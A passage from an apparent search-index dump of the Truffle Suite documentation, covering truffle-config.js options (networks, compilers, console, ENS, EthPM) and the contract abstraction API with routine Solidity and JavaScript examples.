{ solc : { version : \"^0.8.0\" } } }; Be sure to check out the truffle-config.js contained by the barebones project that truffle init creates. The truffle-config.js contains a handful of commented out examples of some configuration options that you might specify/tweak.", "title": "Location"}, {"location": "docs/truffle/reference/configuration/#resolving-naming-conflicts-on-windows", "text": "Note : This only applies to Truffle version 4 and below. When using the Command Prompt on Windows, the default configuration file name can cause a conflict with the truffle executable, and so you may not be able to run Truffle commands properly on existing projects . This is because of the way that command precedence works on the Command Prompt. The truffle.cmd executable is on the path as part of the npm package, but the truffle.js configuration file is in the actual directory where the truffle command is run. Because .js is an acceptable executable extension by default, truffle.js takes precedence over truffle.cmd , causing unexpected results. Any of the following solutions will remedy this issue: Call the executable file explicitly using its .cmd extension ( truffle.cmd compile ) Edit the system PATHEXT environment variable and remove .JS; from the list of executable extensions Rename truffle.js to something else ( truffle-config.js ) Use Windows PowerShell or Git BASH , as these shells do not have this conflict.", "title": "Resolving naming conflicts on Windows"}, {"location": "docs/truffle/reference/configuration/#general-options", "text": "", "title": "General options"}, {"location": "docs/truffle/reference/configuration/#soliditylog", "text": "Like JavaScript's console.log , you can utilize the same concept to print state of your contract during execution. This log will appear when you use truffle test or truffle develop . To use it, import truffle/console.sol into your Solidity contract and use it like you would in JavaScript. See the Nodejs' util.format() documentation for usage details. Here's how to import the truffle/console.sol contract. Expand the code block to see the full usage example. pragma solidity >= 0.4.25 < 0.9.0 ; import \"truffle/console.sol\" ; Example: // SPDX-License-Identifier: MIT pragma solidity >= 0.4.25 < 0.9.0 ; import \"truffle/console.sol\" ; contract Telephone { uint public secret ; constructor ( uint _secret ) payable { console . log ( \"Telephone::constructor\\n\\tsecret: %o\" , _secret ); secret = _secret ; } function derivedSecret () public view returns ( uint256 ) { uint256 telephoneSecret = 100 * secret + 1 ; console . log ( \"The passphrase is: %o\" , secret ); console . log ( \"Leak it a hundred times, plus one: %o\" , telephoneSecret ); return telephoneSecret ; } } const Telephone = artifacts . require ( \"Telephone\" ); const getRnd = function () { const [ min , max ] = [ 13 , 1013 ]; return Math . floor ( Math . random () * ( max - min + 1 )) + min ; } contract ( \"Telephone\" , function ( /* accounts */ ) { let subject ; describe ( \"Works with new deployment\" , function () { let newSecret ; before ( async function () { newSecret = getRnd (); subject = await Telephone . new ( newSecret ); }); it ( \"Should have a deployed contract\" , async function () { return assert . isTrue ( subject !== undefined ); }); it ( \"has the secret\" , async function () { const secret = await subject . secret (); assert . strictEqual ( secret , newSecret ); }); it ( \"has the derived Secret\" , async function () { const derivedSecret = await subject . derivedSecret (); const expected = 100 * newSecret + 1 ; assert . strictEqual ( derivedSecret , expected ); }); }); });", "title": "solidityLog"}, {"location": "docs/truffle/reference/configuration/#displayprefix", "text": "You can set the displayPrefix string to decorate console.log 's output. This is useful when you want to differentiate console.log from verbose output in the terminal. For example: module . exports = { ... solidityLog : { displayPrefix : \" :\" } } Would produce the following truffle test output $ truffle test Compiling your contracts... =========================== > Compiling ./contracts/Telephone.sol > Artifacts written to /tmp/test--19090-s3Aobp6MBrr3 > Compiled successfully using: - solc: 0.8.17+commit.8df45f5f.Emscripten.clang Contract: Telephone Works with new deployment : Telephone::constructor : secret: 786n \u2714 Should have a deployed contract \u2714 has the secret : The passphrase is: 786n : Leak it a hundred times, plus one: 78601n \u2714 has the derived Secret 3 passing (161ms)", "title": "displayPrefix"}, {"location": "docs/truffle/reference/configuration/#preventconsolelogmigration", "text": "Because it's hard to exactly reason about gas usage when a truffle/console.sol is deployed to mainnet, you can opt in to guarding your project. When solidityLog.preventConsoleLogMigration is true, truffle migrate will stop migration on mainnet. module . exports = { ... solidityLog : { preventConsoleLogMigration : true // default is false, } }", "title": "preventConsoleLogMigration"}, {"location": "docs/truffle/reference/configuration/#build", "text": "Build configuration of your application, if your application requires tight integration with Truffle. Most users likely will not need to configure this option. See the Build Processes section for more details.", "title": "build"}, {"location": "docs/truffle/reference/configuration/#networks", "text": "Specifies which networks are available for deployment during migrations, as well as specific transaction parameters when interacting with each network (such as gas price, from address, etc.). When compiling and running migrations on a specific network, contract artifacts will be saved and recorded for later use. When your contract abstractions detect that your Ethereum client is connected to a specific network, they'll use the contract artifacts associated with that network to simplify app deployment. Networks are identified through Ethereum's net_version RPC call, as well as blockchain URIs. The networks object, shown below, is keyed by network names and each name contains a corresponding object that defines the parameters of the network. You will most likely want to provide your own network names and configurations to tell Truffle what networks to connect to for deployments and testing. Once you have defined your networks, you can provide the names as an option for certain commands; this is possible during testing or running migrations. You might specify a network name during migrations as follows: $ truffle migrate --network live Note that if no --network option is provided when using commands that require a network, Truffle will by default look for a network named \"development\" in your truffle-config.js . It will then use those settings to try and connect. See the provided examples below for some guidance on defining your networks. Example: networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" , // match any network websockets : true }, live : { host : \"178.25.19.88\" , // Random IP for example purposes (do not use) port : 80 , network_id : 1 , // Ethereum public network // optional config values: // gas - use gas and gasPrice if creating type 0 transactions // gasPrice - all gas values specified in wei // maxFeePerGas - use maxFeePerGas and maxPriorityFeePerGas if creating type 2 transactions (https://eips.ethereum.org/EIPS/eip-1559) // maxPriorityFeePerGas - // from - default address to use for any transaction Truffle makes during migrations // provider - web3 provider instance Truffle should use to talk to the Ethereum network. // - function that returns a web3 provider instance (see below.) // - if specified, host and port are ignored. // production: - set to true if you would like to force a dry run to be performed every time you migrate using this network (default: false) // - during migrations Truffle performs a dry-run if you are deploying to a 'known network' // skipDryRun: - set to true if you don't want to test run the migration locally before the actual migration (default: false) // confirmations: - number of confirmations to wait between deployments (default: 0) // timeoutBlocks: - if a transaction is not mined, keep waiting for this number of blocks (default: 50) // deploymentPollingInterval: - duration between checks for completion of deployment transactions // networkCheckTimeout: - amount of time for Truffle to wait for a response from the node when testing the provider (in milliseconds) // - increase this number if you have a slow internet connection to avoid connection errors (default: 5000) // disableConfirmationListener: - set to true to disable web3's confirmation listener } } For each network, if unspecified, transaction options will default to the following values: gas : Gas limit used for deploys. Default is 6721975 . gasPrice : Gas price used for deploys. Default is 20000000000 (20 Gwei). from : From address used during migrations. Defaults to the first available account provided by your Ethereum client. provider : Default web3 provider using host and port options: new Web3.providers.HttpProvider(\"https://<host>:<port>\") websockets : You will need this enabled to use the confirmations listener or to hear Events using .on or .once . Default is false . deploymentPollingInterval : When a smart contract is deployed, this determines how often to check whether the transaction has been completed, specified in milliseconds. Default is 4000 . Note that this is independent of the polling interval that provider may use. See @truffle/hdwallet-provider documentation if you are using HDWalletProvider and wish to specify a custom pollingInterval . Note that it is perfectly fine to set disableConfirmationListener while also setting a value for confirmations ; this will not cause hangs during deployment. For each network, you can specify host / port , url , or provider , but not more than one. If you need an HTTP provider, we recommend using host and port , or url , while if you need a custom provider such as HDWalletProvider , you must use provider . The url option also supports WebSockets and SSL. url should include the full url; see the examples below: http://127.0.0.1:8545 ws://127.0.0.1:8545 https://sandbox.truffleteams.com/yoursandboxid wss://sandbox.truffleteams.com/yoursandboxid", "title": "networks"}, {"location": "docs/truffle/reference/configuration/#special-managed-networks-test-and-develop", "text": "The networks test and develop are special, in that they can be used to specify the settings for the managed Ganache instance started by truffle test and truffle develop , respectively. These options are simply included like any other network options. The supported options are: network_id : The network ID to use. Defaults to 5777. total_accounts : The number of unlocked accounts Ganache should provide. Defaults to 10. Alias: accounts . default_balance_ether : The default amount of ether to seed unlocked accounts with, specified in ether. Defaults to 100 ether. Alias: defaultEtherBalance . blockTime : If specified, the number of seconds inbetween mining blocks (as opposed to automatically mining on each transaction sent). Defaults to 0 (i.e., automine). fork : If specified, the URL of a provider that Ganache should fork from. hardfork : Allows specifying the hardfork (EVM version) that Ganache should use. gasLimit : The block gas limit. Defaults to 6721975. gasPrice : The gas price, specified in wei. Defaults to 2000000000 wei. genesis_time : The genesis time. Alias: time . host : The hostname to listen on. Defaults to \"127.0.0.1\" . Only applies to truffle develop , not truffle test . port : The port to listen on. Defaults to 9545. Only applies to truffle develop , not truffle test . Note: In the case of truffle test , these options will only be applied if no host , port , url , or provider is set. If one of these is set, then the test network will not be treated specially and no managed instance of Ganache will be started; instead truffle test will attempt to connect to the specified provider.", "title": "Special (managed) networks: test and develop"}, {"location": "docs/truffle/reference/configuration/#console", "text": "Use this option to configure the console environment. This is the environment you get when using truffle console or truffle develop . require : Use this to specify a JavaScript module that will be loaded into the console environment at startup. Your module's default export must be an object with named keys. Each key will used as a variable name, assigned its value, and be available in the console environment. For example, if your JavaScript is module.exports = { myVariable: \"three doughnuts please!\" } then you will have the variable myVariable available in the console with the value \"three doughnuts please!\" . You may specify this option in several ways. 1. The value of require can be a string path to the target JavaScript file to be loaded. 2. An object with a path property that is a string path to the JavaScript to be loaded. 3. An object with a path property that is a string path to the JavaScript to be loaded as well as an as property that specifies the namespace where the variables loaded will be available. The following are examples of how you can set this property in your truffle-config.js . You can set console.require to be a string path. module . exports = { console : { require : \"./somePath.js\" } } You can alternatively set console.require to an array of objects where you specify a path property. Note the use of the optional property as when specifying the path \"../../someOtherPath.js\" . The values loaded from that module will be namespaced under myVariables in the console environment. In other words, you will access the loaded variables from that module like myVariables.<myVariableName> . module . exports = { console : { require : [ { path : \"./somePath.js\" }, { path : \"../../someOtherPath.js\" , as : \"myVariables\" } ] } }", "title": "console"}, {"location": "docs/truffle/reference/configuration/#providers", "text": "The following network list consists of a local test network and an Infura-hosted Ropsten network, both provided by HDWalletProvider. Make sure you wrap @truffle/hdwallet-provider instances in a function closure as shown below to ensure that only one network is ever connected at a time. networks : { ropsten : { provider : function () { return new HDWalletProvider ( mnemonic , \"https://ropsten.infura.io/v3/YOUR-PROJECT-ID\" ); }, network_id : '3' , }, test : { provider : function () { return new HDWalletProvider ( mnemonic , \"http://127.0.0.1:8545/\" ); }, network_id : '*' , }, } If you specify host and port instead of provider , Truffle will create its own default HTTP provider using that host and port, and no minimal network connection will be opened, so there is no need to do the function wrapping workaround. That said, you wouldn't be able to use a custom provider in this case.", "title": "Providers"}, {"location": "docs/truffle/reference/configuration/#contracts_directory", "text": "The default directory for uncompiled contracts is ./contracts relative to the project root. If you wish to keep your contracts in a different directory you may specify a contracts_directory property. Example: To have Truffle find contracts in ./allMyStuff/someStuff/theContractFolder (recursively) at compile time: module . exports = { contracts_directory : \"./allMyStuff/someStuff/theContractFolder\" , networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" , } } }; Note : In addition to specifying a relative path, you can also use globs/regular expressions to selectively compile contracts.", "title": "contracts_directory"}, {"location": "docs/truffle/reference/configuration/#contracts_build_directory", "text": "The default output directory for compiled contracts is ./build/contracts relative to the project root. This can be changed with the contracts_build_directory key. Examples: To place the built contract artifacts in ./output/contracts : module . exports = { contracts_build_directory : \"./output\" , networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" , } } }; The built contract artifacts do not need to be inside the project root: module . exports = { contracts_build_directory : \"../../../output\" , networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" , } } }; Absolute paths will also work. This is not recommended though, as an absolute path may not exist when compiled on another system. If you use absolute paths on Windows, make sure to use double backslashes for paths (example: C:\\\\Users\\\\Username\\\\output ).", "title": "contracts_build_directory"}, {"location": "docs/truffle/reference/configuration/#migrations_directory", "text": "The default migrations directory is ./migrations relative to the project root. This can be changed with the migrations_directory key. Example: module . exports = { migrations_directory : \"./allMyStuff/someStuff/theMigrationsFolder\" , networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" , } } };", "title": "migrations_directory"}, {"location": "docs/truffle/reference/configuration/#dashboard", "text": "Configuration options for the Truffle Dashboard . These options will be used when running truffle dashboard inside the project directory and these details will be used for the built in \"dashboard\" network. Example: module . exports = { dashboard : { port : 24012 , host : \"localhost\" , verbose : false , } };", "title": "dashboard"}, {"location": "docs/truffle/reference/configuration/#mocha", "text": "Configuration options for the MochaJS testing framework. This configuration expects an object as detailed in Mocha's documentation . Example: mocha : { useColors : true }", "title": "mocha"}, {"location": "docs/truffle/reference/configuration/#etherscan", "text": "Configuration options that Truffle will use when attempting to download source code from Etherscan . Has one suboption: apiKey : The API key to use when retrieving source code from Etherscan. If omitted, source will be retrieved without an API key, which may be slower. Example: etherscan : { apiKey : \"0123456789abcdef0123456789abcdef\" //replace this with your API key if you have one }", "title": "etherscan"}, {"location": "docs/truffle/reference/configuration/#sourcefetchers", "text": "A list of verified source repositories that Truffle may attempt to download source code from, in the order it should attempt to use them. Currently the supported repositories are \"etherscan\" (for Etherscan ) and \"sourcify\" (for Sourcify ). The default is [\"etherscan\", \"sourcify\"] , i.e., to check Etherscan first, then Sourcify. Example: sourceFetchers : [ \"sourcify\" , \"etherscan\" ] //prefer Sourcify over Etherscan", "title": "sourceFetchers"}, {"location": "docs/truffle/reference/configuration/#compiler-configuration", "text": "In the compilers object you can specify settings related to the compilers used by Truffle.", "title": "Compiler configuration"}, {"location": "docs/truffle/reference/configuration/#solc", "text": "Solidity compiler settings. Supports optimizer settings for solc , as well as other settings such as debug and metadata settings. You may specify... + any solc-js version (using semver) listed at solc-bin . Specify the one you want and Truffle will get it for you. + \"native\" to use a natively compiled solc binary (you'll need to install this yourself, links to help below). + a dockerized solc tag from one of images published here . + a path to a locally available solc + \"pragma\" to have Truffle autodetect solc versions from your source files. This can be used to compile using multiple versions of solc. + a solc-js parser for faster docker and native compilations Truffle config example: module . exports = { compilers : { solc : { version : < string > , // A version or constraint - Ex. \"^0.5.0\" // Can be set to \"native\" to use a native solc or // \"pragma\" which attempts to autodetect compiler versions docker : < boolean > , // Use a version obtained through docker parser : \"solcjs\" , // Leverages solc-js purely for speedy parsing settings : { optimizer : { enabled : < boolean > , runs : < number > // Optimize for how many times you intend to run the code }, evmVersion : < string > // Default: \"istanbul\" }, modelCheckerSettings : { // contains options for SMTChecker } } } } For more information, please see the Solidity documentation on Compiler Input JSON Description for the various possible settings. Note that customizing stopAfter and outputSelection are not currently supported.", "title": "solc"}, {"location": "docs/truffle/reference/configuration/#vyper", "text": "Vyper compiler settings. Similar to the solc settings, but not as extensive. In particular, specifying a Vyper version is not currently supported; your local Vyper installation will always be used. Truffle config example: module . exports = { compilers : { vyper : { settings : { evmVersion : < string > , optimize : < boolean > //defaults to true } } } } Currently, only changing the settings is supported for Vyper; see the Vyper documentation on Compiler Input JSON Description for the possible settings. Note that customizing outputSelection is not supported.", "title": "vyper"}, {"location": "docs/truffle/reference/configuration/#external-compilers", "text": "For more advanced use cases with artifact creation you can use the external compilers configuration. You can use this feature by adding a compilers.external object to your Truffle config: module . exports = { compilers : { external : { command : \"./compile-contracts\" , targets : [{ /* compilation output */ }] } } } When you run truffle compile, Truffle will run the configured command and look for contract artifacts specified by targets. This new configuration supports a couple of main use cases: Your compilation command outputs Truffle JSON artifacts directly. If your compilation command generates artifacts directly, or generates output that contains all the information for an artifact, configure a target as follows: module . exports = { compilers : { external : { command : \"./compile-contracts\" , targets : [{ path : \"./path/to/artifacts/*.json\" }] } } } Truffle will execute your script, then expand the glob (*) and find all .json files in the listed path and copy those over as artifacts in the build/contracts/ directory. Your compilation command outputs individual parts of an artifact, and you want Truffle to generate the artifacts for you. The above use case might not be sufficient for all use cases. You can configure your target to run an arbitrary post-processing command: module . exports = { compilers : { external : { command : \"./compile-contracts\" , targets : [{ path : \"./path/to/preprocessed-artifacts/*.json\" , command : \"./process-artifact\" }] } } } This will run ./process-artifact for each matched .json file, piping the contents of that file as stdin. Your ./process-artifact command is then expected to output a complete Truffle artifact as stdout. Want to provide the path as a filename instead? Add stdin: false to your target configuration. You can also specify the individual properties of your contracts and have Truffle generate the artifacts itself. module . exports = { compilers : { external : { command : \"./compile-contracts\" , targets : [{ properties : { contractName : \"MyContract\" , /* other literal properties */ }, fileProperties : { abi : \"./output/contract.abi\" , bytecode : \"./output/contract.bytecode\" , /* other properties encoded in output files */ } }] } } } Specify properties and/or fileProperties , and Truffle will look for those values when building the artifacts. To override the working directory for all specified paths and running commands, use the workingDirectory option. For instance, the following will run ./proj/compile-contracts and read ./proj/output/contract.abi : module . exports = { compilers : { external : { command : \"./compile-contracts\" , workingDirectory : \"./proj\" , targets : [{ fileProperties : { abi : \"./output/contract.abi\" , bytecode : \"./output/contract.bytecode\" , } }] } } }", "title": "external compilers"}, {"location": "docs/truffle/reference/configuration/#plugins", "text": "Note : This feature is new and still in a barebones state. Please let us know how we can improve it! Provides Truffle with a list of installed third-party extensions installed as NPM package dependencies. Truffle supports two separate kinds of plugins. The first are run plugins that define a custom workflow command. More information on these can be found under Third-Party Plugin Commands . The second type of plugins are preserve plugins that define a custom workflow for preserving content using the truffle preserve command. More information on these can be found under Preserving Files and Content to Storage Platforms .", "title": "plugins"}, {"location": "docs/truffle/reference/configuration/#environments", "text": "Environments are a way to specify different configuration parameters depending on the selected environment. For example, connection to IPFS is often done with a local node or ganache, while in production, it makes sense to connect to Infura. This can be configured with environments. module . exports = { /* ... rest of truffle-config */ environments : { /* ... other environments */ development : { ipfs : { address : 'http://localhost:5001 } }, production: { ipfs: { address: ' https : //ipfs.infura.io:5001' } } } }", "title": "Environments"}, {"location": "docs/truffle/reference/configuration/#ens-configuration", "text": "Configuration for Truffle's Ethereum Name Service support can be done either globally or per-network. However, either way, it must be enabled globally to be used. module . exports = { /* ... rest of truffle-config */ ens : { enabled : true //turns on ENS support -- must be set to use ENS features! registry : { address : '0x0123456789012345678901234567890123456789' //allows specifying a custom registry address } }, networks : { /* ... other networks */ myNetwork : { /* ...rest of network config */ ens : { registry : { address : '0x9876543210987654321098765432109876543210' //specify a custom registry address for this network only } } } } } A registry address for a particular network will, for that network, override the global setting. Also, if you explicitly set the registry address to null for a particular network, this will turn off the custom registry address for that network (this is useful if, for instance, you want to use the deployer's development registry). A global registry address can alternately be set in config.ens.registryAddress instead of config.ens.registry.address ; please don't set both of these. Likewise, a registry address for a specific network can alternately be set in config.networks.<network_name>.registry.address or config.networks.<network_name>.registryAddress instead of config.networks.<network_name>.ens.registry.address ; again, please don't set more than one of these.", "title": "ENS configuration"}, {"location": "docs/truffle/reference/configuration/#ethpm-configuration", "text": "This configuration applies to the optional ethpm.json file that exists alongside your truffle.js configuration file.", "title": "EthPM configuration"}, {"location": "docs/truffle/reference/configuration/#package_name", "text": "Name of the package you're publishing. Your package name must be unique to the EthPM registry. Example: package_name : \"adder\"", "title": "package_name"}, {"location": "docs/truffle/reference/configuration/#version", "text": "Version of this package, using the semver specification. Example: version : \"0.0.3\"", "title": "version"}, {"location": "docs/truffle/reference/configuration/#description", "text": "A text description of your package for human readers. Example: description : \"Simple contract to add two numbers\"", "title": "description"}, {"location": "docs/truffle/reference/configuration/#authors", "text": "An array of authors. Can have any format, but we recommend the format below. Example: authors : [ \"Tim Coulter <tim.coulter@consensys.net>\" ]", "title": "authors"}, {"location": "docs/truffle/reference/configuration/#keywords", "text": "An array of keywords that tag this package with helpful categories. Example: keywords : [ \"ethereum\" , \"addition\" ],", "title": "keywords"}, {"location": "docs/truffle/reference/configuration/#dependencies", "text": "A list of EthPM packages your package depends on, using semver version ranges, like npm. Example: dependencies : { \"owned\" : \"^0.0.1\" , \"erc20-token\" : \"1.0.0\" }", "title": "dependencies"}, {"location": "docs/truffle/reference/configuration/#license", "text": "License to use for this package; primarily informative. Contracts created with truffle create will also include this in their SPDX-License-Identifier comment. Example: license : \"MIT\" ,", "title": "license"}, {"location": "docs/truffle/reference/contract-abstractions/", "text": "Contract Abstractions \u00b6 Truffle provides contract abstractions for interacting with your contracts. Skip ahead to the api section for a list of contract methods. Usage \u00b6 To obtain a contract abstraction you can require it with the contract name from the artifacts object. Outside of the console this is an object available in migration files, tests, and exec scripts. You would require your contract as follows: const MyContract = artifacts . require ( \"MyContract\" ); You can also obtain one in the developer console. Your contract types are available here and all you need to do is use the at , deployed , or new method. truffle ( development ) > const myContract = await MyContract . deployed (); You now have access to the following functions on MyContract , as well as many others: at() : Create an instance of MyContract that represents your contract at a specific address. deployed() : Create an instance of MyContract that represents the default address managed by MyContract . new() : Deploy a new version of this contract to the network, getting an instance of MyContract that represents the newly deployed instance. Each instance is tied to a specific address on the Ethereum network, and each instance has a 1-to-1 mapping from Javascript functions to contract functions. For instance, if your Solidity contract had a function defined someFunction(uint value) {} (solidity), then you could execute that function on the network like so: let deployed ; MyContract . deployed () . then (( instance ) => { deployed = instance ; return deployed . someFunction ( 5 ); }). then (( result ) => { // Do something with the result or continue with more transactions. }); You can also use async/await syntax which is often much less verbose. We will use async/await for the rest of this document but you may also use a promises for interfacing with contract methods as well. const deployed = await MyContract . deployed (); const result = await deployed . someFunction ( 5 ); // Do something with the result or continue with more transactions. See the processing transaction results section to learn more about the results object obtained from making transactions. Contract methods and events have an EventEmitter interface. So you can set up handlers like the following: const example = await artifacts . require ( \"Example\" ). deployed (); example . setValue ( 45 ) . on ( 'transactionHash' , hash => {}) . on ( 'receipt' , receipt => {}) . on ( 'error' , error => {}) . on ( 'confirmation' , ( num , receipt ) => {}) . then ( receipt => {}); example . ExampleEvent () . on ( 'data' , event => ... etc ... ) example . ExampleEvent () . once ( 'data' , event => ... etc ... ) API \u00b6 There are two API's you'll need to be aware of. One is the static Contract Abstraction API and the other is the Contract Instance API. The Abstraction API is a set of functions that exist for all contract abstractions, and those function exist on the abstraction itself (i.e., MyContract.at() ). In contrast, the Instance API is the API available to contract instances -- i.e., abstractions that represent a specific contract on the network -- and that API is created dynamically based on functions available in your Solidity source file. Contract Abstraction API \u00b6 Each contract abstraction -- MyContract in the examples above -- have the following useful functions: MyContract.new([arg1, arg2, ...], [tx params]) \u00b6 This function takes whatever constructor parameters your contract requires and deploys a new instance of the contract to the network. There's an optional last argument which you can use to pass transaction parameters including the transaction from address, gas limit and gas price. This function returns a Promise that resolves into a new instance of the contract abstraction at the newly deployed address. MyContract.at(address) \u00b6 This function creates a new instance of the contract abstraction representing the contract at the passed in address. Returns a \"thenable\" object (not yet an actual Promise for backward compatibility). Resolves to a contract abstraction instance after ensuring code exists at the specified address. MyContract.deployed() \u00b6 Creates an instance of the contract abstraction representing the contract at its deployed address. The deployed address is a special value given to @truffle/contract that, when set, saves the address internally so that the deployed address can be inferred from the given Ethereum network being used. This allows you to write code referring to a specific deployed contract without having to manage those addresses yourself. Like at() , deployed() is thenable, and will resolve to a contract abstraction instance representing the deployed contract after ensuring that code exists at that location and that that address exists on the network being used. MyContract.link(instance) \u00b6 Link a library represented by a contract abstraction instance to MyContract. The library must first be deployed and have its deployed address set. The name and deployed address will be inferred from the contract abstraction instance. When this form of MyContract.link() is used, MyContract will consume all of the linked library's events and will be able to report that those events occurred during the result of a transaction. Libraries can be linked multiple times and will overwrite their previous linkage. Note: This method has two other forms, but this form is recommended. MyContract.link(name, address) \u00b6 Link a library with a specific name and address to MyContract. The library's events will not be consumed using this form. MyContract.link(object) \u00b6 Link multiple libraries denoted by an Object to MyContract. The keys must be strings representing the library names and the values must be strings representing the addresses. Like above, libraries' events will not be consumed using this form. MyContract.networks() \u00b6 View a list of network ids this contract abstraction has been set up to represent. MyContract.setProvider(provider) \u00b6 Sets the web3 provider this contract abstraction will use to make transactions. MyContract.setNetwork(network_id) \u00b6 Sets the network that MyContract is currently representing. MyContract.hasNetwork(network_id) \u00b6 Returns a boolean denoting whether or not this contract abstraction is set up to represent a specific network. MyContract.defaults([new_defaults]) \u00b6 Get's and optionally sets transaction defaults for all instances created from this abstraction. If called without any parameters it will simply return an Object representing current defaults. If an Object is passed, this will set new defaults. Example default transaction values that can be set are: MyContract . defaults ({ from : ..., gas : ..., gasPrice : ..., value : ... }) Setting a default from address, for instance, is useful when you have a contract abstraction you intend to represent one user (i.e., one address). MyContract.clone(network_id) \u00b6 Clone a contract abstraction to get another object that manages the same contract artifacts, but using a different network_id . This is useful if you'd like to manage the same contract but on a different network. When using this function, don't forget to set the correct provider afterward. const MyOtherContract = MyContract . clone ( 1337 ); MyContract.numberFormat = number_type \u00b6 You can set this property to choose the number format that abstraction methods return. The default behavior is to return BN. // Choices are: `[\"BigNumber\", \"BN\", \"String\"]. const Example = artifacts . require ( 'Example' ); Example . numberFormat = 'BigNumber' ; MyContract.timeout(block_timeout) \u00b6 This method allows you to set the block timeout for transactions. Contract instances created from this abstraction will have the specified transaction block timeout. This means that if a transaction does not immediately get mined, it will retry for the specified number of blocks. MyContract.autoGas = <boolean> \u00b6 If this is set to true, instances created from this abstraction will use web3.eth.estimateGas and then apply a gas multiplier to determine the amount of gas to include with the transaction. The default value for this is true . See gasMultiplier . MyContract.gasMultiplier(gas_multiplier) \u00b6 This is the value used when autoGas is enabled to determine the amount of gas to include with transactions. The gas is computed by using web3.eth.estimateGas and multiplying it by the gas multiplier. The default value is 1.25 . Contract Instance API \u00b6 Each contract instance is different based on the source Solidity contract, and the API is created dynamically. For the purposes of this documentation, let's use the following Solidity source code below: contract MyContract { uint public value ; event ValueSet ( uint val ); function setValue ( uint val ) { value = val ; emit ValueSet ( value ); } function getValue () view returns ( uint ) { return value ; } } From Javascript's point of view, this contract has three functions: setValue , getValue and value . This is because value is public and automatically creates a getter function for it. Making a transaction via a contract function \u00b6 When we call setValue() , this creates a transaction. From Javascript: const result = await instance . setValue ( 5 ); // result object contains import information about the transaction console . log ( \"Value was set to\" , result . logs [ 0 ]. args . val ); The result object that gets returned looks like this: { tx : \"0x6cb0bbb6466b342ed7bc4a9816f1da8b92db1ccf197c3f91914fc2c721072ebd\" , receipt : { // The return value from web3.eth.getTransactionReceipt(hash) // See https://github.com/ethereum/wiki/wiki/JavaScript-API#web3ethgettransactionreceipt }, logs : [ { logIndex : 0 , transactionIndex : 0 , transactionHash : '0x728b4d1983cd00d93ae00b7adf76f78c1b32d922de636ead42e93f70cf58cdc9' , blockHash : '0xdce5e6c580267c9bf1d82bf0a167fa60509ef9fc520b8619d8183a8373a42035' , blockNumber : 19 , address : '0x035b8A9e427d93D178E2D22d600B779717696831' , type : 'mined' , id : 'log_70be22b0' , event : 'Transfer' , args : Result { '0' : '0x7FEb9FAA5aED0FD547Ccc70f00C19dDe95ea54d4' , '1' : '0x7FEb9FAA5aED0FD547Ccc70f00C19dDe95ea54d4' , '2' : < BN : 1 > , __length__ : 3 , _from : '0x7FEb9FAA5aED0FD547Ccc70f00C19dDe95ea54d4' , _to : '0x7FEb9FAA5aED0FD547Ccc70f00C19dDe95ea54d4' , _value : < BN : 1 > } } ], } Note that if the function being executed in the transaction has a return value, you will not get that return value inside this result. You must instead use an event (like ValueSet ) and look up the result in the logs array. Explicitly making a call instead of a transaction \u00b6 We can call setValue() without creating a transaction by explicitly using .call : const value = await instance . setValue . call ( 5 ); This isn't very useful in this case, since setValue() sets things, and the value we pass won't be saved since we're not creating a transaction. Calling getters \u00b6 However, we can get the value using getValue() , using .call() . Calls are always free and don't cost any Ether, so they're good for calling functions that read data off the blockchain: const value = await instance . getValue . call (); // value reprsents the `value` storage object in the solidity contract // since the contract returns that value. Even more helpful, however is we don't even need to use .call when a function is marked as view or pure (or the deprecated constant ), because @truffle/contract will automatically know that that function can only be interacted with via a call: const value = await instance . getValue (); // val reprsents the `value` storage object in the solidity contract // since the contract returns that value. Overloaded functions \u00b6 Solidity supports a contract having multiple functions with the same name as long as the function argument types differ. And so you may find yourself in the situation of having a Truffle contract object with this property. You can invoke these \"overloaded\" functions just like you would a normal contract function. Truffle contract instances actually wrap web3's contract abstraction ( web3.eth.Contract ) and when you call an overloaded function, it uses the same function resolution that web3 uses. However, we must give a warning that this overloaded function resolution is often imprecise and can resolve to the wrong function when you call it. Consider the following contrived code sample: contract MyContract { uint256 public myUint ; string public myString ; string public myOtherString ; function setValues ( uint256 val , string str ) { myUint = val ; myString = str } function setValues ( string str , string otherStr ) { myString = str ; myOtherString = otherStr ; } function setValues ( uint256 val , string str , string otherStr ) { myUint = val ; myString = str ; myOtherString = otherStr ; } } This Solidity contract contains three functions named setValues , each taking a different type of input. In your JavaScript you might do something like the following: await instance . setValue ( 666 , \"this is not string cheese\" , \"this is string cheese\" ); As mentioned above, Truffle contract wraps web3 Contract objects and uses web3's overloaded function resolution. To resolve these functions, web3's strategy is to look at the number of arguments that the function was invoked with and try one that takes that many arguments. This works for some cases but is not ideal in that it can invoke the incorrect function. Take, for example, the case where we do something like the following: await instance . setValue ( \"this is not string cheese\" , \"this is string cheese\" ); We know that in our contract there are two functions named setValues that take two arguments. In the above case, we cannot be sure whether web3's resolution will resolve to the first or second function. The more precise way to reference functions like this is to use the methods property on the contract instance. The following is an example of how you access these methods: await instance . methods [ \"setValue(string,string)\" ]( \"this is not string cheese\" , \"this is string cheese\" ); The methods property is an object whose keys are strings that correspond to the contract function's names and signatures with no spaces. The values are the functions themselves. You can inspect the methods property to see the key names in this object and match the function signature. We recommend using this method of calling overloaded functions since it will unambiguously resolve to the correct function. Processing transaction results \u00b6 When you make a transaction, you're given a result object that gives you a wealth of information about the transaction. You're given the transaction hash ( result.tx ), the decoded events (also known as logs; result.logs ), and a transaction receipt ( result.receipt ). In the below example, you'll receive the ValueSet() event because you triggered the event using the setValue() function: const result = await instance . setValue ( 5 ); // result.tx => transaction hash, string // result.logs => array of trigger events (1 item in this case) // result.receipt => receipt object Sending Ether / Triggering the fallback function \u00b6 You can trigger the fallback function by sending a transaction to this function: const result = instance . sendTransaction ({...}); // Same result object as above. This is promisified like all available contract instance functions, and has the same API as web3.eth.sendTransaction without the callback. The to value will be automatically filled in for you. If you only want to send Ether to the contract a shorthand is available: const result = await instance . send ( web3 . toWei ( 1 , \"ether\" )); // Same result object as above. Estimating gas usage \u00b6 Run this function to estimate the gas usage: const result = instance . setValue . estimateGas ( 5 ); // result => estimated gas for this transaction", "title": "Contract abstractions"}, {"location": "docs/truffle/reference/contract-abstractions/#contract-abstractions", "text": "Truffle provides contract abstractions for interacting with your contracts. Skip ahead to the api 